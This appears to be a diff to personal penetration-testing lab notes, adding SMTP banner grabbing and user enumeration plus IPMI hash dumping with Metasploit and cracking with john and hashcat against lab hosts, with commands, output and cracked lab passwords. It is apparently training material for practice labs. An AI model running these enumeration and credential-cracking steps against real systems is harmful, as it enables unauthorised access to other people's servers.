@@ -99,6 +99,63 @@ $ openssl s_client -connect 10.129.14.136:21 -starttls ftp
 ---
 # SMB
 
+# SMTP
+
+## Telnet - HELO/EHLO
+
+```bash
+$ telnet 10.129.14.128 25
+
+Trying 10.129.14.128...
+Connected to 10.129.14.128.
+Escape character is '^]'.
+220 ESMTP Server 
+
+
+HELO mail1.inlanefreight.htb
+
+250 mail1.inlanefreight.htb
+
+
+EHLO mail1
+
+250-mail1.inlanefreight.htb
+250-PIPELINING
+250-SIZE 10240000
+250-ETRN
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250-DSN
+250-SMTPUTF8
+250 CHUNKING
+```
+
+## Enumerate Users
+
+```bash
+smtp-user-enum.pl -M RCPT -U footprinting-wordlist.txt -t 10.129.183.47 -m 30
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 30
+Usernames file ........... footprinting-wordlist.txt
+Target count ............. 1
+Username count ........... 101
+Target TCP port .......... 25
+Query timeout ............ 20 secs
+Target domain ............
+
+######## Scan started at Sat Jan  3 17:00:21 2026 #########
+10.129.183.47: robin exists
+######## Scan completed at Sat Jan  3 17:01:06 2026 #########
+1 results.
+```
+
+
 # IPMI
 
 ## Nmap
@@ -141,10 +198,38 @@ msf6 auxiliary(scanner/ipmi/ipmi_version) > run
 ```bash
 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
-msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_JOHN_FILE /tmp/john
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
 
 [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
 [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
+```
+
+```bash
+❯ john /tmp/john --pot=/tmp/pot
+Warning: detected hash type "RAKP", but the string is also recognized as "RAKP-opencl"
+Use the "--format=RAKP-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 AVX 4x])
+Will run 16 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Warning: Only 33 candidates buffered for the current salt, minimum 64 needed for performance.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+trinity          (10.129.123.98 admin)
+1g 0:00:00:00 DONE 2/3 (2026-01-03 16:55) 1.515g/s 255200p/s 255200c/s 255200C/s 123456..Sssing
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+```bash
+❯ hashcat -hh | grep -i ipmi
+   7350 | IPMI2 RAKP HMAC-MD5                                        | Network Protocol
+   7300 | IPMI2 RAKP HMAC-SHA1                                       | Network Protocol
+```
+
+```bash
+hashcat -m 7300 -w 3 -O "b081fa2a82040000f7e192614794e63912d6c9961ab06854bf9dc9a2ebc8449600f2eef9ac50a27fa123456789abcdefa123456789abcdef140561646d696e:3bd5bdeabf53cb432bc8b7c8922c1b31005d19cb" ~/rockyou.txt
 ```
 
